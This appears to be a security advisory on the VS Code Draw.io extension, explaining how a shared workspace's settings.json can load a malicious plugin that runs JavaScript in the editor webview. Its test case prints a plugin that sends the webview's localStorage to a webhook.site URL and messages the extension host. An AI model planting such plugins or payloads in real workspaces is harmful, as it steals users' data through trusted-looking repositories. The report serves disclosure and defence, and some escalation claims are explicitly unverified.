### Vulnerability List:

- Vulnerability Name: Arbitrary Code Execution via Malicious Workspace Plugin

- Description:
    1. An attacker crafts a malicious Javascript file designed as a Draw.io plugin. This plugin can contain arbitrary code to be executed within the Draw.io editor webview.
    2. The attacker creates a VS Code workspace and includes the malicious plugin file within the workspace folder.
    3. The attacker configures the Draw.io extension within the workspace settings (`.vscode/settings.json`) to load the malicious plugin upon opening a Draw.io diagram. This is done by adding an entry to the `hediet.vscode-drawio.plugins` setting, pointing to the malicious Javascript file using the `${workspaceFolder}` variable.
    4. The attacker distributes this workspace (e.g., via email, shared repository, or social engineering) and tricks a victim into opening it in VS Code.
    5. When the victim opens a `.drawio`, `.dio`, `.drawio.svg` or `.drawio.png` file within the workspace, the Draw.io extension attempts to load the configured plugins.
    6. VS Code displays a dialog prompting the user to allow or disallow loading the unknown plugin, identified by its file path and SHA256 fingerprint.
    7. If the victim, either unknowingly or through social engineering, clicks "Allow", the malicious plugin code is loaded and executed within the Draw.io editor's webview context.
    8. The malicious plugin code can then perform actions such as:
        - Accessing and exfiltrating data from the Draw.io editor's local storage, which might contain diagram data or settings.
        - Using `window.opener.postMessage` to send messages back to the VS Code extension host. Depending on the capabilities exposed by the extension's message handling, this could potentially lead to further exploitation or information disclosure within the VS Code environment.
        - Modifying the behavior of the Draw.io editor to further compromise the user or their diagrams.

- Impact:
    - High: Successful exploitation allows arbitrary Javascript code execution within the Draw.io editor webview.
    - Potential for exfiltration of sensitive diagram data or VS Code extension data.
    - Possible, but not fully investigated, escalation of privileges or further compromise of the VS Code environment through `window.opener.postMessage` communication, depending on the extension's message handling implementation.
    - Compromised Draw.io editor functionality, leading to data manipulation or unexpected behavior for the user.

- Vulnerability Rank: high

- Currently Implemented Mitigations:
    - User Confirmation Dialog: Before loading a plugin for the first time or after it has been changed, the extension shows a warning dialog prompting the user to allow or disallow the plugin. This is implemented in `DrawioClientFactory.ts` in `getPlugins` function.
    - Plugin Fingerprinting: The extension calculates the SHA256 fingerprint of the plugin file and displays it in the confirmation dialog. This helps users identify if a plugin file has been modified since it was last allowed. Implemented in `DrawioClientFactory.ts` in `getPlugins` function.
    - Known Plugins List: The extension maintains a list of known plugins in user settings (`hediet.vscode-drawio.knownPlugins`). Once a user allows or disallows a plugin, their decision (and the plugin's fingerprint) is stored in this list to avoid prompting the user again for the same plugin version. Implemented in `Config.ts` and `DrawioClientFactory.ts` in `getPlugins` function.

- Missing Mitigations:
    - Plugin Sandboxing: The extension lacks a security sandbox for Draw.io plugins. Plugins are loaded and executed within the same Javascript context as the Draw.io editor, granting them full access to the editor's objects, functions, and the `window.opener.postMessage` API.
    - Plugin Code Validation: The extension does not perform any validation or sanitization of the plugin Javascript code before execution. It blindly trusts the code within the plugin file.
    - Content Security Policy (CSP) Restriction: While the extension sets a CSP, it is very permissive (`default-src * ...`), effectively disabling its security benefits and not preventing execution of malicious scripts from plugins. A stricter CSP could limit the capabilities of malicious plugins.

- Preconditions:
    - The victim must open a VS Code workspace provided or influenced by the attacker.
    - The workspace must contain a malicious Draw.io plugin file and a `.vscode/settings.json` file configured to load this plugin.
    - The victim must open a Draw.io diagram file within this workspace.
    - The victim must click "Allow" in the plugin confirmation dialog when prompted by VS Code.

- Source Code Analysis:
    1. **`Config.ts`**: The `plugins` getter in `DiagramConfig` reads the plugin configuration from the `hediet.vscode-drawio.plugins` setting. It uses `evaluateTemplate` to resolve workspace-relative paths, allowing plugins to be loaded from within the workspace.
    ```typescript
    public get plugins(): { file: Uri }[] {
        return this._plugins.get().map((entry) => {
            const fullFilePath = this.evaluateTemplate(entry.file, "plugins");
            return { file: Uri.file(fullFilePath) };
        });
    }
    ```
    2. **`DrawioClientFactory.ts`**: The `getPlugins` function fetches plugin files. It reads the file content, calculates the SHA256 hash, checks against known plugins, and prompts the user if the plugin is unknown. If allowed, it includes the plugin's Javascript code in `pluginsToLoad`.
    ```typescript
    private async getPlugins(
        config: DiagramConfig
    ): Promise<{ jsCode: string }[]> {
        // ...
        for (const p of config.plugins) {
            let jsCode: string;
            try {
                jsCode = BufferImpl.from(
                    await workspace.fs.readFile(p.file)
                ).toString("utf-8");
            } catch (e) {
                window.showErrorMessage(
                    `Could not read plugin file "${p.file}"!`
                );
                continue;
            }

            const fingerprint = sha256.hex(jsCode);
            const pluginId = p.file.toString();

            const isAllowed = this.config.isPluginAllowed(
                pluginId,
                fingerprint
            );
            // ... prompt user and add to pluginsToLoad if allowed
        }
        // ...
        return pluginsToLoad;
    }
    ```
    3. **`DrawioClientFactory.ts`**: The `getOfflineHtml` function constructs the HTML content for the Draw.io webview. It injects the `customPluginPaths` and `additionalCode` (containing plugin Javascript code) into the HTML.
    ```typescript
    private getOfflineHtml(
        config: DiagramConfig,
        options: DrawioClientOptions,
        webview: Webview,
        plugins: { jsCode: string }[]
    ): string {
        // ...
        const patchedHtml = html
            // ...
            .replace(
                "$$customPluginPaths$$",
                JSON.stringify([customPluginsPath.toString()])
            )
            .replace("$$localStorage$$", JSON.stringify(localStorage))
            .replace(
                "$$additionalCode$$",
                JSON.stringify(plugins.map((p) => p.jsCode))
            );
        return patchedHtml;
    }
    ```
    4. **`webview-content.html`** (Not provided, but assumed to exist and handle plugin loading): The HTML content loaded into the webview, based on Draw.io's plugin mechanism, likely uses the `Draw.loadPlugin` function to execute the Javascript code provided in `additionalCode`. This execution happens within the webview's Javascript context, which has access to `window.opener.postMessage` for communication with the VS Code extension.

- Security Test Case:
    1. Create a file named `malicious-plugin.js` in a new directory. Add the following malicious code to it:
    ```javascript
    Draw.loadPlugin(function(ui) {
        // Attempt to exfiltrate local storage data
        const localStorageData = JSON.stringify(localStorage);
        fetch('https://webhook.site/YOUR_WEBHOOK_URL', { // Replace with your webhook URL for testing
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                pluginId: 'malicious-plugin',
                localStorage: localStorageData
            })
        }).catch(error => console.error('Fetch Error:', error));

        // Send a message back to VS Code extension (potential further exploit)
        if (window.opener) {
            window.opener.postMessage(JSON.stringify({
                event: 'maliciousPluginExecuted',
                message: 'Plugin executed and data exfiltrated (simulated)'
            }), '*');
        }
    });
    ```
    **Note:** Replace `https://webhook.site/YOUR_WEBHOOK_URL` with a testing webhook URL (e.g., from webhook.site) to observe the exfiltrated data.

    2. In the same directory, create a new file named `test.drawio`. This file can be empty or contain a simple diagram.

    3. In the same directory, create a folder named `.vscode`. Inside `.vscode`, create a file named `settings.json` and add the following configuration:
    ```json
    {
        "hediet.vscode-drawio.plugins": [
            {
                "file": "${workspaceFolder}/malicious-plugin.js"
            }
        ]
    }
    ```

    4. Open VS Code and open the directory you created as a workspace (File -> Open Folder...).

    5. Open the `test.drawio` file. VS Code will prompt a dialog saying "Do you want to load and run plugin from this workspace?". The dialog will show the path to `malicious-plugin.js` and its fingerprint.

    6. Click "Allow".

    7. **Observe the results:**
        - **Network Request:** Check the network requests made by the Draw.io webview. You can do this by opening the developer tools of the webview (right-click in the diagram editor, choose "Inspect (Webview)"). In the "Network" tab, you should see a POST request to `https://webhook.site/YOUR_WEBHOOK_URL` (or your testing webhook URL), containing the local storage data in the request body. This confirms data exfiltration.
        - **VS Code Output (Optional):** While not implemented to handle in this example, in a real exploit scenario, if the VS Code extension had a vulnerable message handler for `maliciousPluginExecuted` event, further actions could be triggered in VS Code itself. For this test case, observe the VS Code Output panel for any unexpected messages or errors originating from the extension.

    8. If you observe the network request to your webhook URL with local storage data, and potentially any unexpected behavior in VS Code, the vulnerability is confirmed.